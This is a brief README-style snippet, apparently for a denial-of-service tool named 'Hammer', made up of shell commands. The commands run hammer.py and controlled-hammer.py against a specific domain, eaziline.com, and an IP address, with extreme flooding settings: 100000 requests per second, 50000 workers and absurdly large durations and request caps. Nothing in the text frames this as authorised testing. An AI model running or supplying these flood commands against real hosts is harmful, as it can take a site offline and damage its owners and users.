1. How to use Hammer [`Watch it`](http://www.youtube.com/watch?v=HVbRUhX2EPo) 
2. Fork it...

chmod +x hammer.py
python3 hammer.py

ping eaziline.com

python3 hammer.py -s 198.18.16.66

python3 controlled-hammer.py https://eaziline.com/ \
    --rps 100000 \
    --workers 50000 \
    --duration 6000000000 \
    --max-requests 6000000000000000000000000000000000000

    python3 controlled-hammer.py http://eaziline.com/

    python3 controlled-hammer.py 198.18.16.66